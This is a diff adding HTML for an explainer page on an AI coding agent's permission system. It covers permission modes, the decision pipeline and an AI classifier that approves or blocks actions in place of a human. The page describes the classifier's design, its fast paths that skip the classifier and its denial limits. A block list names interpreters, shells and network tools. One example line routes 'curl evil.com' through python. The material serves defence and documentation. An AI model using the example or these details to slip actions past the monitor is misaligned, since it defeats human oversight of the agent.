+              <rect x="190" y="143" width="116" height="28" rx="5" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+              <text x="248" y="157" fill="#8b949e" font-size="8.5" font-family="monospace" text-anchor="middle">dontAsk · auto mode</text>
+              <text x="248" y="168" fill="#8b949e" font-size="8.5" font-family="monospace" text-anchor="middle">headless deny</text>
+            </g>
+
+            <!-- Arrow: outer → inner -->
+            <path id="arrow-2" class="hero-svg-arrow" d="M318 130 L355 130" stroke="#58a6ff" stroke-width="1.5" fill="none" marker-end="url(#arrowhead-blue)" stroke-dasharray="5 4"/>
+
+            <!-- Node: inner pipeline -->
+            <g id="node-inner" class="hero-svg-node">
+              <rect x="358" y="60" width="150" height="140" rx="8" fill="#21262d" stroke="rgba(88,166,255,0.4)" stroke-width="1.5"/>
+              <text x="433" y="82" fill="#58a6ff" font-size="9" font-family="monospace" text-anchor="middle" font-weight="600" letter-spacing="0.05em">INNER PIPELINE</text>
+              <line x1="370" y1="89" x2="496" y2="89" stroke="rgba(88,166,255,0.2)" stroke-width="1"/>
+              <!-- Phase labels -->
+              <rect x="370" y="96" width="126" height="18" rx="4" fill="rgba(248,81,73,0.1)" stroke="rgba(248,81,73,0.2)" stroke-width="1"/>
+              <text x="433" y="109" fill="#f85149" font-size="9" font-family="monospace" text-anchor="middle" font-weight="600">PHASE 1: Deny / Ask</text>
+              <rect x="370" y="120" width="126" height="18" rx="4" fill="rgba(63,185,80,0.1)" stroke="rgba(63,185,80,0.2)" stroke-width="1"/>
+              <text x="433" y="133" fill="#3fb950" font-size="9" font-family="monospace" text-anchor="middle" font-weight="600">PHASE 2: Mode Allow</text>
+              <rect x="370" y="144" width="126" height="18" rx="4" fill="rgba(88,166,255,0.1)" stroke="rgba(88,166,255,0.2)" stroke-width="1"/>
+              <text x="433" y="157" fill="#58a6ff" font-size="9" font-family="monospace" text-anchor="middle" font-weight="600">PHASE 3: Passthrough</text>
+              <text x="433" y="185" fill="#8b949e" font-size="8" font-family="monospace" text-anchor="middle">hasPermissionsToUse</text>
+              <text x="433" y="196" fill="#8b949e" font-size="8" font-family="monospace" text-anchor="middle">ToolInner()</text>
+            </g>
+
+            <!-- Arrows out to outcomes -->
+            <path id="arrow-allow" class="hero-svg-arrow" d="M508 100 L640 100 L680 100" stroke="#3fb950" stroke-width="1.5" fill="none" marker-end="url(#arrowhead-green)" stroke-dasharray="5 4"/>
+            <path id="arrow-deny" class="hero-svg-arrow" d="M508 130 L640 130 L680 130" stroke="#f85149" stroke-width="1.5" fill="none" marker-end="url(#arrowhead-red)" stroke-dasharray="5 4"/>
+            <path id="arrow-ask" class="hero-svg-arrow" d="M508 160 L640 160 L680 160" stroke="#d29922" stroke-width="1.5" fill="none" marker-end="url(#arrowhead-orange)" stroke-dasharray="5 4"/>
+
+            <!-- Outcome nodes -->
+            <g id="node-allow" class="hero-svg-node">
+              <rect x="683" y="82" width="80" height="36" rx="6" fill="rgba(63,185,80,0.1)" stroke="rgba(63,185,80,0.35)" stroke-width="1.5"/>
+              <text x="723" y="104" fill="#3fb950" font-size="11" font-family="monospace" text-anchor="middle" font-weight="700">allow</text>
+            </g>
+            <g id="node-deny" class="hero-svg-node">
+              <rect x="683" y="112" width="80" height="36" rx="6" fill="rgba(248,81,73,0.1)" stroke="rgba(248,81,73,0.35)" stroke-width="1.5"/>
+              <text x="723" y="134" fill="#f85149" font-size="11" font-family="monospace" text-anchor="middle" font-weight="700">deny</text>
+            </g>
+            <g id="node-ask" class="hero-svg-node">
+              <rect x="683" y="142" width="80" height="36" rx="6" fill="rgba(210,153,34,0.1)" stroke="rgba(210,153,34,0.35)" stroke-width="1.5"/>
+              <text x="723" y="164" fill="#d29922" font-size="11" font-family="monospace" text-anchor="middle" font-weight="700">ask</text>
+            </g>
+
+            <!-- YOLO classifier branch -->
+            <path id="arrow-yolo" class="hero-svg-arrow" d="M723 178 L723 218 L600 218 L600 250" stroke="rgba(188,140,255,0.7)" stroke-width="1.5" fill="none" marker-end="url(#arrowhead)" stroke-dasharray="5 4"/>
+            <g id="node-yolo" class="hero-svg-node">
+              <rect x="530" y="240" width="140" height="30" rx="6" fill="rgba(188,140,255,0.1)" stroke="rgba(188,140,255,0.3)" stroke-width="1.5"/>
+              <text x="600" y="259" fill="#bc8cff" font-size="9.5" font-family="monospace" text-anchor="middle" font-weight="600">YOLO Classifier (auto mode)</text>
+            </g>
+
+            <!-- Labels -->
+            <text x="525" y="92" fill="#3fb950" font-size="8.5" font-family="monospace">allow</text>
+            <text x="525" y="122" fill="#f85149" font-size="8.5" font-family="monospace">deny</text>
+            <text x="525" y="152" fill="#d29922" font-size="8.5" font-family="monospace">ask</text>
+          </svg>
+        </div>
+      </div>
+    </section>
+
+    <!-- =================================================================
+         Section 1: Permission Modes
+         ================================================================= -->
+    <section class="page-section" id="modes">
+      <div class="container">
+        <div class="section-header reveal">
+          <p class="section-label">Section 01</p>
+          <h2 class="section-title">The Seven Permission Modes</h2>
+          <p class="section-desc">
+            Five user-facing modes and two internal modes control the overall security stance.
+            They determine whether actions are auto-allowed, auto-denied, or sent to the AI classifier.
+          </p>
+        </div>
+
+        <div class="mode-grid reveal">
+
+          <!-- default -->
+          <div class="mode-card mode-card-default">
+            <div class="mode-card-icon icon-default">🔒</div>
+            <p class="mode-card-name">default</p>
+            <p class="mode-card-desc">Normal interactive mode. The user is prompted for approval on any tool use not covered by an explicit allow rule. This is the experience for most users.</p>
+            <span class="mode-behavior-tag tag-blue">Prompts user on unknown tools</span>
+          </div>
+
+          <!-- acceptEdits -->
+          <div class="mode-card mode-card-acceptEdits">
+            <div class="mode-card-icon icon-acceptEdits">✏️</div>
+            <p class="mode-card-name">acceptEdits</p>
+            <p class="mode-card-desc">Auto-allows file edits (Write, Edit, NotebookEdit) when the target is within the working directory. Bash and other tools still require approval. Forms the auto-mode fast path.</p>
+            <span class="mode-behavior-tag tag-green">Auto-allows in-CWD file edits</span>
+          </div>
+
+          <!-- bypassPermissions -->
+          <div class="mode-card mode-card-bypass">
+            <div class="mode-card-icon icon-bypass">⚡</div>
+            <p class="mode-card-name">bypassPermissions</p>
+            <p class="mode-card-desc">Allows all tool uses except those blocked by explicit deny rules, content-specific ask rules, or bypass-immune safety checks (.git/, .claude/, shell configs).</p>
+            <span class="mode-behavior-tag tag-red">--dangerously-skip-permissions</span>
+          </div>
+
+          <!-- dontAsk -->
+          <div class="mode-card mode-card-dontAsk">
+            <div class="mode-card-icon icon-dontAsk">🚫</div>
+            <p class="mode-card-name">dontAsk</p>
+            <p class="mode-card-desc">Never prompts the user. Any tool use that would normally produce an <code>ask</code> result is converted to <code>deny</code>. Designed for non-interactive CI contexts.</p>
+            <span class="mode-behavior-tag tag-orange">ask → deny (no human present)</span>
+          </div>
+
+          <!-- plan -->
+          <div class="mode-card mode-card-plan">
+            <div class="mode-card-icon icon-plan">📋</div>
+            <p class="mode-card-name">plan</p>
+            <p class="mode-card-desc">Planning mode. If <code>bypassPermissions</code> was active before entering plan mode (<code>isBypassPermissionsModeAvailable</code>), plan mode also bypasses. Otherwise behaves like <code>default</code>.</p>
+            <span class="mode-behavior-tag tag-cyan">Inherits prior bypass state</span>
+          </div>
+
+          <!-- auto -->
+          <div class="mode-card mode-card-auto">
+            <div class="mode-card-icon icon-auto">🤖</div>
+            <p class="mode-card-name">auto</p>
+            <span class="mode-internal-badge">Internal</span>
+            <p class="mode-card-desc">Uses an AI classifier (YOLO Classifier) instead of a human prompt. Only available when <code>TRANSCRIPT_CLASSIFIER</code> build feature is enabled. Feature-gated at compile time.</p>
+            <span class="mode-behavior-tag tag-purple">AI classifier replaces human</span>
+          </div>
+
+          <!-- bubble -->
+          <div class="mode-card mode-card-bubble">
+            <div class="mode-card-icon icon-bubble">↑</div>
+            <p class="mode-card-name">bubble</p>
+            <span class="mode-internal-badge">Internal</span>
+            <p class="mode-card-desc">Propagation mode used when permission decisions need to bubble up through nested contexts. Not directly settable by users or external configuration.</p>
+            <span class="mode-behavior-tag tag-gray">Permission propagation only</span>
+          </div>
+
+        </div><!-- .mode-grid -->
+      </div>
+    </section>
+
+    <!-- =================================================================
+         Section 2: Permission Decision Flow
+         ================================================================= -->
+    <section class="page-section" id="decision-flow">
+      <div class="container">
+        <div class="section-header reveal">
+          <p class="section-label">Section 02</p>
+          <h2 class="section-title">The Decision Pipeline</h2>
+          <p class="section-desc">
+            <code>hasPermissionsToUseToolInner()</code> runs in three ordered phases. Deny and ask checks
+            are evaluated first and cannot be overridden. Click any step to expand its details.
+          </p>
+        </div>
+
+        <div class="flow-container reveal" id="flow-container">
+
+          <!-- Phase 1 -->
+          <div class="flow-phase-header">
+            <span class="flow-phase-num phase-num-1">1</span>
+            <span class="flow-phase-title">Deny &amp; Ask Checks</span>
+            <span class="flow-phase-subtitle">Cannot be overridden by any mode — fires first</span>
+          </div>
+          <div class="flow-steps">
+
+            <div class="flow-step" data-step="1a">
+              <div class="flow-step-header">
+                <span class="flow-step-id">1a</span>
+                <span class="flow-step-name">Tool-level deny rule check</span>
+                <span class="flow-step-outcome outcome-deny">→ deny</span>
+                <span class="flow-step-chevron">›</span>
+              </div>
+              <div class="flow-step-body">
+                <div class="flow-step-content">
+                  <code>getDenyRuleForTool()</code> scans all deny rules from all sources (userSettings, projectSettings, cliArg, etc.). If any rule matches the tool and its input, the action is immediately denied. No mode can override this.
+                </div>
+              </div>
+            </div>
+
+            <div class="flow-step" data-step="1b">
+              <div class="flow-step-header">
+                <span class="flow-step-id">1b</span>
+                <span class="flow-step-name">Tool-level ask rule check</span>
+                <span class="flow-step-outcome outcome-ask">→ ask</span>
+                <span class="flow-step-chevron">›</span>
+              </div>
+              <div class="flow-step-body">
+                <div class="flow-step-content">
+                  <code>getAskRuleForTool()</code> checks for explicit ask rules. If found, the user is prompted — unless a sandbox auto-allow applies. This is separate from the default "unknown tool" prompt.
+                </div>
+              </div>
+            </div>
+
+            <div class="flow-step" data-step="1c">
+              <div class="flow-step-header">
+                <span class="flow-step-id">1c</span>
+                <span class="flow-step-name">Tool-specific permission check</span>
+                <span class="flow-step-outcome outcome-check">→ varies</span>
+                <span class="flow-step-chevron">›</span>
+              </div>
+              <div class="flow-step-body">
+                <div class="flow-step-content">
+                  Each tool implements its own <code>tool.checkPermissions(input, context)</code>. For Bash, this evaluates subcommand rules and command-level allow/deny matching. For file tools (Edit, Write), this checks path rules against allow/deny globs. Returns one of: <code>allow</code>, <code>deny</code>, <code>ask</code>, or <code>passthrough</code>.
+                </div>
+              </div>
+            </div>
+
+            <div class="flow-step" data-step="1d">
+              <div class="flow-step-header">
+                <span class="flow-step-id">1d</span>
+                <span class="flow-step-name">Tool returned deny?</span>
+                <span class="flow-step-outcome outcome-deny">→ deny</span>
+                <span class="flow-step-chevron">›</span>
+              </div>
+              <div class="flow-step-body">
+                <div class="flow-step-content">
+                  If the tool's <code>checkPermissions()</code> returned <code>deny</code> (e.g., path is in a dangerous directory, or an explicit deny rule matched at the tool level), the action is blocked immediately.
+                </div>
+              </div>
+            </div>
+
+            <div class="flow-step" data-step="1e">
+              <div class="flow-step-header">
+                <span class="flow-step-id">1e</span>
+                <span class="flow-step-name">Tool requires user interaction?</span>
+                <span class="flow-step-outcome outcome-ask">→ ask</span>
+                <span class="flow-step-chevron">›</span>
+              </div>
+              <div class="flow-step-body">
+                <div class="flow-step-content">
+                  If <code>tool.requiresUserInteraction()</code> is true and the current behavior is <code>ask</code>, the user must be prompted — even in <code>bypassPermissions</code> mode. Some tools inherently need human confirmation to function correctly.
+                </div>
+              </div>
+            </div>
+
+            <div class="flow-step" data-step="1f">
+              <div class="flow-step-header">
+                <span class="flow-step-id">1f</span>
+                <span class="flow-step-name">Content-specific ask rule?</span>
+                <span class="flow-step-outcome outcome-ask">→ ask (bypass-immune)</span>
+                <span class="flow-step-chevron">›</span>
+              </div>
+              <div class="flow-step-body">
+                <div class="flow-step-content">
+                  If the decision reason is a rule with <code>ruleBehavior === 'ask'</code> (rather than a default passthrough), the ask is bypass-immune. Even <code>bypassPermissions</code> mode must prompt the user if an explicit ask rule matched the content.
+                </div>
+              </div>
+            </div>
+
+            <div class="flow-step" data-step="1g">
+              <div class="flow-step-header">
+                <span class="flow-step-id">1g</span>
+                <span class="flow-step-name">Safety check for sensitive paths</span>
+                <span class="flow-step-outcome outcome-ask">→ ask (bypass-immune)</span>
+                <span class="flow-step-chevron">›</span>
+              </div>
+              <div class="flow-step-body">
+                <div class="flow-step-content">
+                  If the decision reason is a <code>safetyCheck</code> (sensitive path: <code>.git/</code>, <code>.claude/</code>, <code>.vscode/</code>, shell configs), the ask survives even <code>bypassPermissions</code> mode. These protections cannot be bypassed by any mode flag. Includes Windows UNC path blocking and cross-machine bridge messages.
+                </div>
+              </div>
+            </div>
+
+          </div><!-- .flow-steps phase 1 -->
+
+          <!-- Phase 2 -->
+          <div class="flow-phase-header" style="border-top:1px solid var(--border);">
+            <span class="flow-phase-num phase-num-2">2</span>
+            <span class="flow-phase-title">Mode-Based Allow</span>
+            <span class="flow-phase-subtitle">If no deny or ask fired, the mode decides</span>
+          </div>
+          <div class="flow-steps">
+
+            <div class="flow-step" data-step="2a">
+              <div class="flow-step-header">
+                <span class="flow-step-id">2a</span>
+                <span class="flow-step-name">bypassPermissions (or plan with bypass available)?</span>
+                <span class="flow-step-outcome outcome-allow">→ allow</span>
+                <span class="flow-step-chevron">›</span>
+              </div>
+              <div class="flow-step-body">
+                <div class="flow-step-content">
+                  If the current mode is <code>bypassPermissions</code>, or if the mode is <code>plan</code> and <code>isBypassPermissionsModeAvailable</code> is true (the user was in bypass before entering plan mode), the action is allowed without prompting.
+                </div>
+              </div>
+            </div>
+
+            <div class="flow-step" data-step="2b">
+              <div class="flow-step-header">
+                <span class="flow-step-id">2b</span>
+                <span class="flow-step-name">Tool-level allow rule?</span>
+                <span class="flow-step-outcome outcome-allow">→ allow</span>
+                <span class="flow-step-chevron">›</span>
+              </div>
+              <div class="flow-step-body">
+                <div class="flow-step-content">
+                  <code>toolAlwaysAllowedRule()</code> checks for an explicit allow rule matching this tool and input from any source. If found, the action proceeds without a user prompt. This is how permanent "always allow" preferences work.
+                </div>
+              </div>
+            </div>
+
+          </div><!-- .flow-steps phase 2 -->
+
+          <!-- Phase 3 -->
+          <div class="flow-phase-header" style="border-top:1px solid var(--border);">
+            <span class="flow-phase-num phase-num-3">3</span>
+            <span class="flow-phase-title">Passthrough Conversion</span>
+            <span class="flow-phase-subtitle">Deferred decisions become prompts</span>
+          </div>
+          <div class="flow-steps">
+
+            <div class="flow-step" data-step="3">
+              <div class="flow-step-header">
+                <span class="flow-step-id">3</span>
+                <span class="flow-step-name">Tool returned passthrough?</span>
+                <span class="flow-step-outcome outcome-ask">→ ask</span>
+                <span class="flow-step-chevron">›</span>
+              </div>
+              <div class="flow-step-body">
+                <div class="flow-step-content">
+                  <code>passthrough</code> means the tool had no opinion. It is converted to <code>ask</code> so the user is always prompted. This prevents silent auto-allow on unknown inputs — a tool returning <code>passthrough</code> delegates to mode-based logic while still providing optional <code>updatedInput</code> suggestions.
+                </div>
+              </div>
+            </div>
+
+          </div><!-- .flow-steps phase 3 -->
+
+          <!-- Post-processing callout -->
+          <div class="flow-phase-header" style="border-top:1px solid var(--border);">
+            <span class="flow-phase-num phase-num-post">⊕</span>
+            <span class="flow-phase-title">Post-Processing (Outer Wrapper)</span>
+            <span class="flow-phase-subtitle">Mode-specific transformations on the final result</span>
+          </div>
+          <div class="flow-steps" style="padding-bottom:var(--space-5);">
+
+            <div class="flow-step" data-step="post-allow">
+              <div class="flow-step-header">
+                <span class="flow-step-id">P1</span>
+                <span class="flow-step-name">Result is allow</span>
+                <span class="flow-step-outcome outcome-allow">→ allow + reset counter</span>
+                <span class="flow-step-chevron">›</span>
+              </div>
+              <div class="flow-step-body">
+                <div class="flow-step-content">
+                  The consecutive denial counter (auto mode) is reset to zero, and the allow is returned.
+                </div>
+              </div>
+            </div>
+
+            <div class="flow-step" data-step="post-ask">
+              <div class="flow-step-header">
+                <span class="flow-step-id">P2</span>
+                <span class="flow-step-name">Result is ask — mode transformations</span>
+                <span class="flow-step-outcome outcome-check">→ varies by mode</span>
+                <span class="flow-step-chevron">›</span>
+              </div>
+              <div class="flow-step-body">
+                <div class="flow-step-content">
+                  <strong>dontAsk mode:</strong> convert to <code>deny</code>.<br>
+                  <strong>auto mode:</strong> run AI classifier — non-classifier-approvable safety checks keep as ask/deny; <code>acceptEdits</code> fast path may allow; safe-tool allowlist may allow; otherwise run <code>classifyYoloAction()</code> → allow or deny.<br>
+                  <strong>shouldAvoidPermissionPrompts:</strong> run hooks, then auto-deny.
+                </div>
+              </div>
+            </div>
+
+          </div>
+
+        </div><!-- .flow-container -->
+
+        <div class="insight-callout reveal" style="margin-top:var(--space-6);">
+          <p class="insight-callout-label">Key Insight</p>
+          <p>The <code>passthrough</code> behavior exists so a tool can signal "I have no opinion on this input" without forcing either <code>allow</code> or <code>ask</code>. A tool returning <code>allow</code> from <code>checkPermissions()</code> would bypass the mode check at step 2a — by returning <code>passthrough</code>, the tool delegates to mode-based logic while still providing suggestions.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- =================================================================
+         Section 3: YOLO Classifier
+         ================================================================= -->
+    <section class="page-section" id="classifier">
+      <div class="container">
+        <div class="section-header reveal">
+          <p class="section-label">Section 03</p>
+          <h2 class="section-title">The YOLO Classifier</h2>
+          <p class="section-desc">
+            In <code>auto</code> mode, a side-channel AI call to Claude evaluates each pending action against
+            the conversation transcript. Two stages reduce false positives while keeping latency low for easy cases.
+          </p>
+        </div>
+
+        <!-- Pipeline diagram -->
+        <div class="classifier-wrap reveal">
+          <div class="classifier-header">
+            <div class="classifier-title-group">
+              <div class="classifier-icon">🔬</div>
+              <div>
+                <div style="font-size:var(--text-sm);font-weight:var(--font-bold);color:var(--text-primary)">Classifier Pipeline</div>
+                <div style="font-size:var(--text-xs);color:var(--text-secondary)">src/utils/permissions/yoloClassifier.ts</div>
+              </div>
+            </div>
+            <span class="mode-behavior-tag tag-purple">feature: TRANSCRIPT_CLASSIFIER</span>
+          </div>
+
+          <div class="classifier-pipeline">
+            <!-- Node 1: Transcript -->
+            <div class="classifier-node">
+              <span class="classifier-node-icon">📜</span>
+              <div class="classifier-node-title">Transcript Construction</div>
+              <div class="classifier-node-desc">Build compact view of conversation history. <strong>Assistant text is excluded</strong> — only <code>tool_use</code> blocks from assistant turns are included. Prevents prompt injection via model-authored text.</div>
+            </div>
+            <div class="classifier-arrow-col">›</div>
+            <!-- Node 2: System Prompt -->
+            <div class="classifier-node">
+              <span class="classifier-node-icon">⚙️</span>
+              <div class="classifier-node-title">System Prompt Assembly</div>
+              <div class="classifier-node-desc">Base prompt + permissions template. User configures via <code>settings.autoMode</code>: <code>allow[]</code>, <code>soft_deny[]</code>, and <code>environment[]</code> arrays injected into the classifier system prompt.</div>
+            </div>
+            <div class="classifier-arrow-col">›</div>
+            <!-- Node 3: Classify -->
+            <div class="classifier-node" style="border-color:rgba(188,140,255,0.3);">
+              <span class="classifier-node-icon">⚖️</span>
+              <div class="classifier-node-title">Two-Stage XML Classifier</div>
+              <div class="classifier-node-desc">Stage 1 (fast, 64 tokens) + optional Stage 2 (thinking). Reports decision via <code>&lt;block&gt;yes&lt;/block&gt;</code> / <code>&lt;block&gt;no&lt;/block&gt;</code> XML or legacy <code>classify_result</code> tool call.</div>
+            </div>
+          </div>
+
+          <!-- Two stage detail -->
+          <div class="two-stage-grid">
+            <div class="stage-card stage-card-stage1">
+              <span class="stage-badge stage-badge-1">Stage 1 — Fast</span>
+              <div class="stage-title">Low-latency pre-check</div>
+              <div class="stage-detail">
+                <code>max_tokens=64</code>, <code>stop_sequences=['&lt;/block&gt;']</code>. Prompt nudges the model to immediately output <code>&lt;block&gt;yes&lt;/block&gt;</code> or <code>&lt;block&gt;no&lt;/block&gt;</code>. Biased toward blocking: "Err on the side of blocking."
+              </div>
+              <div class="stage-outcome-list">
+                <div class="stage-outcome-item">
+                  <span class="stage-outcome-arrow" style="color:var(--accent-green)">›</span>
+                  <span><code>&lt;block&gt;no&lt;/block&gt;</code> — ALLOW immediately, skip stage 2</span>
+                </div>
+                <div class="stage-outcome-item">
+                  <span class="stage-outcome-arrow" style="color:var(--accent-orange)">›</span>
+                  <span><code>&lt;block&gt;yes&lt;/block&gt;</code> or unparseable — escalate to stage 2</span>
+                </div>
+              </div>
+            </div>
+            <div class="stage-card stage-card-stage2">
+              <span class="stage-badge stage-badge-2">Stage 2 — Thinking</span>
+              <div class="stage-title">Chain-of-thought reasoning</div>
+              <div class="stage-detail">
+                Larger <code>max_tokens</code> budget. Prompt suffix encourages <code>&lt;thinking&gt;</code> tags for step-by-step reasoning. Reduces false positives from stage 1 over-blocking.
+              </div>
+              <div class="stage-outcome-list">
+                <div class="stage-outcome-item">
+                  <span class="stage-outcome-arrow" style="color:var(--accent-green)">›</span>
+                  <span><code>&lt;block&gt;no&lt;/block&gt;</code> — ALLOW</span>
+                </div>
+                <div class="stage-outcome-item">
+                  <span class="stage-outcome-arrow" style="color:var(--accent-red)">›</span>
+                  <span><code>&lt;block&gt;yes&lt;/block&gt;</code> — DENY with reason</span>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Fast paths section -->
+          <div style="padding: 0 var(--space-6) var(--space-5);">
+            <div style="font-size:var(--text-sm);font-weight:var(--font-bold);color:var(--text-primary);margin-bottom:var(--space-3);">Fast Paths (Classifier Bypass)</div>
+            <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:var(--space-3);">
+              <div style="background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius-md);padding:var(--space-3) var(--space-4);">
+                <div style="font-size:var(--text-xs);font-weight:var(--font-bold);color:var(--accent-orange);margin-bottom:var(--space-1);">Non-Classifier Safety Checks</div>
+                <div style="font-size:var(--text-xs);color:var(--text-secondary);line-height:var(--leading-relaxed);">Windows UNC path bypass attempts, cross-machine bridge messages — always prompt/deny. Not classifier-approvable.</div>
+              </div>
+              <div style="background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius-md);padding:var(--space-3) var(--space-4);">
+                <div style="font-size:var(--text-xs);font-weight:var(--font-bold);color:var(--accent-green);margin-bottom:var(--space-1);">acceptEdits Fast Path</div>
+                <div style="font-size:var(--text-xs);color:var(--text-secondary);line-height:var(--leading-relaxed);">Simulates <code>acceptEdits</code> mode check. If the action would be allowed, skip the classifier. Avoids API cost for normal in-CWD file edits.</div>
+              </div>
+              <div style="background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius-md);padding:var(--space-3) var(--space-4);">
+                <div style="font-size:var(--text-xs);font-weight:var(--font-bold);color:var(--accent-blue);margin-bottom:var(--space-1);">Safe-Tool Allowlist</div>
+                <div style="font-size:var(--text-xs);color:var(--text-secondary);line-height:var(--leading-relaxed);">Read, Grep, Glob, LSP, TodoWrite, TaskCreate/Get/Update, Sleep, etc. — always allowed without a classifier call. Read-only and metadata tools.</div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Denial limits -->
+          <div class="denial-limits-bar">
+            <div class="denial-limit-item">
+              <span class="denial-counter">3</span>
+              <span>Maximum <strong>consecutive</strong> classifier denials before fallback to interactive prompting</span>
+            </div>
+            <div class="denial-limit-item">
+              <span class="denial-counter">20</span>
+              <span>Maximum <strong>total</strong> classifier denials per session — headless mode throws <code>AbortError</code></span>
+            </div>
+          </div>
+
+        </div><!-- .classifier-wrap -->
+
+        <div class="insight-callout reveal">
+          <p class="insight-callout-label">Fail-Closed Design</p>
+          <p>When the classifier API is unavailable (network error, rate limit), the <code>tengu_iron_gate_closed</code> feature flag controls behavior. Default (<code>true</code>): deny the action and tell the model to retry or find an alternative approach. If <code>false</code>: fall through to normal permission handling (user prompt).</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- =================================================================
+         Section 4: Dangerous Patterns
+         ================================================================= -->
+    <section class="page-section" id="dangerous-patterns">
+      <div class="container">
+        <div class="section-header reveal">
+          <p class="section-label">Section 04</p>
+          <h2 class="section-title">Dangerous Command Patterns</h2>
+          <p class="section-desc">
+            These patterns are stripped from allow rules when entering auto mode. They represent interpreters
+            and execution primitives that could bypass the classifier's ability to reason about what code runs.
+          </p>
+        </div>
+
+        <div class="patterns-wrap reveal">
+          <table class="patterns-table" aria-label="Dangerous command patterns by category">
+            <thead>
+              <tr>
+                <th>Pattern</th>
+                <th>Category</th>
+                <th>Risk Description</th>
+              </tr>
+            </thead>
+            <tbody>
+              <!-- Cross-platform -->
+              <tr><td class="pattern-code-cell">python / python3 / python2</td><td><span class="cat-badge cat-cross">cross-platform</span></td><td class="pattern-desc-cell">Arbitrary code execution via interpreter</td></tr>
+              <tr><td class="pattern-code-cell">node / deno / tsx</td><td><span class="cat-badge cat-cross">cross-platform</span></td><td class="pattern-desc-cell">JavaScript/TypeScript interpreter — opaque execution</td></tr>
+              <tr><td class="pattern-code-cell">ruby / perl / php / lua</td><td><span class="cat-badge cat-cross">cross-platform</span></td><td class="pattern-desc-cell">Scripting language interpreters</td></tr>
+              <tr><td class="pattern-code-cell">npx / bunx</td><td><span class="cat-badge cat-cross">cross-platform</span></td><td class="pattern-desc-cell">Package runners that can execute remote code</td></tr>
+              <tr><td class="pattern-code-cell">npm run / yarn run / pnpm run / bun run</td><td><span class="cat-badge cat-cross">cross-platform</span></td><td class="pattern-desc-cell">Script runners — can execute arbitrary project scripts</td></tr>
+              <tr><td class="pattern-code-cell">bash / sh / ssh</td><td><span class="cat-badge cat-cross">cross-platform</span></td><td class="pattern-desc-cell">Shell spawning — arbitrary command execution</td></tr>
+              <!-- Bash-specific -->
+              <tr><td class="pattern-code-cell">zsh / fish</td><td><span class="cat-badge cat-bash">bash-specific</span></td><td class="pattern-desc-cell">Additional shells — arbitrary command execution</td></tr>
+              <tr><td class="pattern-code-cell">eval / exec / env / xargs</td><td><span class="cat-badge cat-bash">bash-specific</span></td><td class="pattern-desc-cell">Dynamic code evaluation primitives</td></tr>
+              <tr><td class="pattern-code-cell">sudo</td><td><span class="cat-badge cat-bash">bash-specific</span></td><td class="pattern-desc-cell">Privilege escalation</td></tr>
+              <tr><td class="pattern-code-cell">curl / wget</td><td><span class="cat-badge cat-bash">bash-specific</span></td><td class="pattern-desc-cell">Network fetch — remote code injection vector</td></tr>
+              <tr><td class="pattern-code-cell">git</td><td><span class="cat-badge cat-bash">bash-specific</span></td><td class="pattern-desc-cell">Can execute hooks, modify repo config, exfiltrate data</td></tr>
+              <!-- Cloud/infra -->
+              <tr><td class="pattern-code-cell">kubectl / aws / gcloud / gsutil</td><td><span class="cat-badge cat-cloud">cloud / infra</span></td><td class="pattern-desc-cell">Infrastructure control planes — blast radius is large</td></tr>
+              <!-- Anthropic-internal -->
+              <tr><td class="pattern-code-cell">fa run / coo / gh / gh api</td><td><span class="cat-badge cat-internal">ant-internal</span></td><td class="pattern-desc-cell">Anthropic-internal tooling; only added for ant users</td></tr>
+            </tbody>
+          </table>
+          <div class="patterns-note">
+            <strong>Note:</strong> These patterns are <em>not</em> used for runtime blocking. They are applied at auto-mode entry to strip overly broad allow rules (e.g., <code>Bash(python:*)</code>). This prevents a compromised model from using <code>python -c "import os; os.system('curl evil.com')"</code> to route arbitrary code through an allowed interpreter.
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- =================================================================
+         Section 5: Filesystem Safety
+         ================================================================= -->
+    <section class="page-section" id="filesystem">
+      <div class="container">
+        <div class="section-header reveal">
+          <p class="section-label">Section 05</p>
+          <h2 class="section-title">Filesystem Safety</h2>
+          <p class="section-desc">
+            Path-based checks in <code>src/utils/permissions/filesystem.ts</code> protect sensitive files and
+            directories. These checks survive <code>bypassPermissions</code> mode.
+          </p>
+        </div>
+
+        <div class="fs-grid reveal">
+
+          <!-- Dangerous Files -->
+          <div class="fs-card">
+            <div class="fs-card-header">
+              <span class="fs-card-icon">📄</span>
+              <span class="fs-card-title">Dangerous Files</span>
+              <span class="fs-card-count">9</span>
+            </div>
+            <div class="fs-item-list">
+              <div class="fs-item"><span class="fs-item-icon">🔒</span>.gitconfig<span class="fs-item-reason">can set hooks</span></div>
+              <div class="fs-item"><span class="fs-item-icon">🔒</span>.gitmodules<span class="fs-item-reason">submodule paths</span></div>
+              <div class="fs-item"><span class="fs-item-icon">🔒</span>.bashrc<span class="fs-item-reason">runs on shell start</span></div>
+              <div class="fs-item"><span class="fs-item-icon">🔒</span>.bash_profile<span class="fs-item-reason">runs on login</span></div>
+              <div class="fs-item"><span class="fs-item-icon">🔒</span>.zshrc<span class="fs-item-reason">runs on shell start</span></div>
+              <div class="fs-item"><span class="fs-item-icon">🔒</span>.zprofile<span class="fs-item-reason">runs on login</span></div>
+              <div class="fs-item"><span class="fs-item-icon">🔒</span>.profile<span class="fs-item-reason">runs on login</span></div>
+              <div class="fs-item"><span class="fs-item-icon">🔒</span>.ripgreprc<span class="fs-item-reason">tool config</span></div>
+              <div class="fs-item"><span class="fs-item-icon">🔒</span>.mcp.json / .claude.json<span class="fs-item-reason">can register MCP servers</span></div>
+            </div>
+          </div>
+
+          <!-- Dangerous Directories -->
+          <div class="fs-card">
+            <div class="fs-card-header">
+              <span class="fs-card-icon">📁</span>
+              <span class="fs-card-title">Dangerous Directories</span>
+              <span class="fs-card-count">4</span>
+            </div>
+            <div class="fs-item-list">
+              <div class="fs-item"><span class="fs-item-icon">🔒</span>.git/<span class="fs-item-reason">hooks, config = code execution</span></div>
+              <div class="fs-item"><span class="fs-item-icon">🔒</span>.vscode/<span class="fs-item-reason">tasks, settings = code execution</span></div>
